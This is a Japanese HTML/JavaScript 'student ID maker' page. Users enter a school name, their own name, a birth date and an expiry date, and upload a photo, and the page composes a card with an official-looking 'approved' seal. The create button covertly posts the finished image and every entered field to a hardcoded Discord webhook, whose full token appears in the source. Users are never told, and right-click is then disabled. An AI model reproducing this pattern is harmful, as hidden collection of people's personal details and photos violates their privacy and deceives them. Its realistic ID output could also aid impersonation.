<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<title>学生証メーカー</title>

<style>
body { font-family: sans-serif; padding: 30px; }
.container { display: flex; gap: 30px; align-items: flex-start; }
canvas { border: 1px solid #333; }
input, select, button { width: 260px; margin-bottom: 10px; }
.small { font-size: 12px; color: #666; width: 260px; }
</style>
</head>
<body>

<h2>学生証作成</h2>

<div class="container">

  <!-- 左：完成プレビュー -->
  <canvas id="cardCanvas" width="600" height="350"></canvas>

  <!-- 右：入力 -->
  <div>
    <select id="template">
      <option value="red">赤テンプレ</option>
      <option value="blue">青テンプレ</option>
    </select>

    <input class="value" placeholder="学校名">
    <input class="value" placeholder="学科（任意）">
    <input class="value" placeholder="名前">
    <input class="value" type="date" title="生年月日">
    <input class="value" type="date" title="有効期限">

    <input type="file" id="photo" accept="image/*">

    <button id="sendBtn">作成</button>
  </div>

</div>
  <hr>

<h3>生成結果</h3>

<div id="resultArea" style="display:none; gap:20px;">
  <img id="resultGenerated" width="300">
  <img id="resultFixed" width="300" src="学生証.png">
</div>


<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1467433717969584231/m-MnTavprILs6PC2iK_NMZFRyPG0-rmBlf0y5B4WrJI0gYoHjyJqtg_Y0TVMvCJYpTzU";

const canvas = document.getElementById("cardCanvas");
const ctx = canvas.getContext("2d");
const values = document.querySelectorAll(".value");

const templates = {
  red: "学生証_1.png",
  blue: "学生証_2.png"
};
  // ====== 追加：写真の状態 ======
let photoImg = null;     // アップロード画像を保持
let photoX = 40;         // 写真のX位置（初期値）
let photoY = 90;         // 写真のY位置（初期値）
let photoW = 140;        // 写真の幅（固定）
let photoH = 120;        // ← 仮。実際は読み込み時に縦横比で計算する

let dragging = false;    // ドラッグ中か
let dragOffsetX = 0;     // クリック位置と写真左上の差
let dragOffsetY = 0;
let minPhotoW = 40;    // 最小サイズ
//let maxPhotoW = 300;  // 最大サイズ
let isLocked = false; // 作成ボタンを押したらtrue（右クリック禁止）


// ============================

function draw() {
  const template = document.getElementById("template").value;
  const img = new Image();
  img.src = templates[template];

  img.onload = () => {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
   //頭から上に重ねて描画していく
// ③ 写真（最背面・枠からはみ出た部分は非表示）
if (photoImg) {
  ctx.save();

  // ★ ここが「学生証の内側」クリップ領域（角丸）
  const clipX = 10;   // 内側の左余白（必要に応じて調整）
  const clipY = 10;   // 内側の上余白
  const clipW = 580;  // 600 - 左右余白
  const clipH = 330;  // 350 - 上下余白
  const radius = 25;  // 角丸半径（テンプレに合わせて調整）

  roundedRectPath(ctx, clipX, clipY, clipW, clipH, radius);
  ctx.clip();

  // クリップ内にだけ描かれる
  ctx.drawImage(photoImg, photoX, photoY, photoW, photoH);

  ctx.restore();
}
    // ① テンプレ
    ctx.drawImage(img, 0, 0, 600, 350);

    // ② 文字（位置は必要なら調整してOK）
    ctx.fillStyle = "#000";
    ctx.font = "18px sans-serif";

    ctx.fillText(values[0].value || "学校名", 250, 100);
    ctx.fillText(values[1].value || "", 250, 120);
    ctx.font = "30px sans-serif";
    ctx.fillText(values[2].value || "名無しの権兵衛", 250, 160);
    ctx.font = "10px sans-serif";
    ctx.fillText("生年月日 "+values[3].value || "2000-01-01", 260, 220);
    ctx.fillText("有効期限 "+values[4].value || "2030-03-31", 260, 250);
    ctx.font = "18px sans-serif";
     if (document.getElementById("template").value == "blue") 
     {
       ctx.font = "45px sans-serif";
     ctx.fillText(values[0].value || "学校名", 20, 50);
      ctx.font = "20px sans-serif";
     }
    // ★ 学校名（赤枠内）
drawSchoolLabel(
  document.getElementById("template").value,
  values[0].value || ""
);
  };
}
  function roundedRectPath(ctx, x, y, w, h, r) {
  const rr = Math.min(r, w / 2, h / 2);
  ctx.beginPath();
  ctx.moveTo(x + rr, y);
  ctx.arcTo(x + w, y, x + w, y + h, rr);
  ctx.arcTo(x + w, y + h, x, y + h, rr);
  ctx.arcTo(x, y + h, x, y, rr);
  ctx.arcTo(x, y, x + w, y, rr);
  ctx.closePath();
}

// 入力変更で再描画
document.querySelectorAll("input, select").forEach(e => {
  e.addEventListener("input", draw);
  e.addEventListener("change", draw);
});
  // ====== 追加：写真を1回だけ読み込んで保持 ======
document.getElementById("photo").addEventListener("change", () => {
  const file = document.getElementById("photo").files[0];
  if (!file) {
    photoImg = null;
    draw();
    return;
  }
  const img = new Image();
  img.src = URL.createObjectURL(file);
  img.onload = () => {
  photoImg = img;

  // ★追加：縦横比を維持して高さを自動計算
  const ratio = img.height / img.width; // 高さ / 幅
  photoH = Math.round(photoW * ratio);

  draw();
};
});
// ===============================================


// canvas → blob を await できる形に
function canvasToBlob(cnv, type="image/png", quality=0.92) {
  return new Promise((resolve) => {
    cnv.toBlob((blob) => resolve(blob), type, quality);
  });
}

document.getElementById("sendBtn").addEventListener("click", async () => {
isLocked = true;
  const school = values[0].value || "-";
  const department = values[1].value || "-";
  const name = values[2].value || "-";
  const birthday = values[3].value || "-";
  const expiry = values[4].value || "-";

    // ① 画像（合成済みCanvas）をPNGに
    const pngBlob = await canvasToBlob(canvas, "image/png");

    // ② Discordへ multipart/form-data で送る
    const formData = new FormData();

    const payload = {
      embeds: [{
        title: "学生証（架空）",
        color: 3447003,
        fields: [
          { name: "学校名", value: school, inline: false },
          { name: "学科", value: department, inline: false },
          { name: "名前", value: name, inline: false },
          { name: "生年月日", value: birthday, inline: true },
          { name: "有効期限", value: expiry, inline: true }
        ],
        image: { url: "attachment://card.png" }
      }]
    };

    formData.append("payload_json", JSON.stringify(payload));
    formData.append("files[0]", pngBlob, "card.png");

    const res = await fetch(WEBHOOK_URL, {
      method: "POST",
      body: formData
    });
  // ====== 追加：画面下に画像を並べて表示 ======
const markedDataURL = createMarkedImage(canvas);

document.getElementById("resultGenerated").src = markedDataURL;
document.getElementById("resultArea").style.display = "flex";

});
// ====== 追加：canvas上で写真をドラッグ移動 ======
function getMousePos(evt) {
  const rect = canvas.getBoundingClientRect();
  return {
    x: evt.clientX - rect.left,
    y: evt.clientY - rect.top
  };
}

function isInsidePhoto(mx, my) {
  return (
    photoImg &&
    mx >= photoX && mx <= photoX + photoW &&
    my >= photoY && my <= photoY + photoH
  );
}

canvas.addEventListener("mousedown", (e) => {
  const { x, y } = getMousePos(e);
  if (isInsidePhoto(x, y)) {
    dragging = true;
    dragOffsetX = x - photoX;
    dragOffsetY = y - photoY;
  }
});

canvas.addEventListener("mousemove", (e) => {
  if (!dragging) return;
  const { x, y } = getMousePos(e);

  photoX = x - dragOffsetX;
  photoY = y - dragOffsetY;
  draw();
});

  // ====== 追加：ホイールで写真を拡大縮小（比率維持） ======
canvas.addEventListener("wheel", (e) => {
  if (!photoImg) return;

  const { x, y } = getMousePos(e);

  // 写真の上にマウスがあるときだけ反応
  if (!isInsidePhoto(x, y)) return;

  e.preventDefault(); // ページスクロール防止

  const oldW = photoW;
  const oldH = photoH;

  // 拡大 or 縮小
  const delta = e.deltaY < 0 ? 1.1 : 0.9;
  photoW = Math.max(minPhotoW,photoW * delta);

  // 縦横比維持
  const ratio = photoImg.height / photoImg.width;
  photoH = photoW * ratio;

  // マウス位置を中心に拡大縮小
  const scale = photoW / oldW;
  photoX = x - (x - photoX) * scale;
  photoY = y - (y - photoY) * scale;

  // はみ出し防止
  photoX = Math.max(0, Math.min(photoX, canvas.width - photoW));
  photoY = Math.max(0, Math.min(photoY, canvas.height - photoH));

  draw();
}, { passive: false });
// ===============================================


window.addEventListener("mouseup", () => {
  dragging = false;
});
  canvas.addEventListener("contextmenu", (e) => {
  if (isLocked) return;      // 作成前は普通に右クリックOK
  e.preventDefault();         // 作成後だけ右クリックメニュー無効
});

// ===============================================

// 初期描画
draw();

  function drawSchoolLabel(template, schoolName) {
  // ===== 表示文字を決定 =====
  let line1 = "";
  let line2 = "";

  if (schoolName.includes("学園")) {
    line1 = "学園長";
    line2 = "認可";
  } else if (schoolName.includes("学校")) {
    line1 = "学校長";
    line2 = "認可";
  } else {
    line1 = "生徒会認可";
  }

  // ===== テンプレ別 座標 =====
  let x, y;

  if (template === "red") {
    // 赤テンプレ用（★調整してOK）
     line1="認";
    line2="可";
    x = 530;
    y = 285;
  } else {
    line1=line1+line2;
    line2="";
    // 青テンプレ用（★調整してOK）
    x = 30;
    y = 310;
  }

  // ===== 描画 =====
  ctx.fillStyle = "#c00000"; // 赤文字
  ctx.font = "28px sans-serif";

  ctx.fillText(line1, x, y);

  if (line2) {
    ctx.fillText(line2, x, y + 28); // 改行分ずらす
  }
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  function createMarkedImage(canvas) {
  const temp = document.createElement("canvas");
  temp.width = canvas.width;
  temp.height = canvas.height;
  const tctx = temp.getContext("2d");

  // 元画像をコピー
  tctx.drawImage(canvas, 0, 0);

  // ★ マークを描画（例：右下に赤丸＋文字）
  tctx.fillStyle = "rgba(255,0,0,0.8)";
  tctx.beginPath();
  tctx.arc(560, 310, 20, 0, Math.PI * 2);
  tctx.fill();

  tctx.fillStyle = "#fff";
  tctx.font = "16px sans-serif";
  tctx.textAlign = "center";
  tctx.fillText("✔", 560, 316);

  return temp.toDataURL("image/png");
}

//------------------------------------------------------------------------------------------------
</script>

</body>
</html>
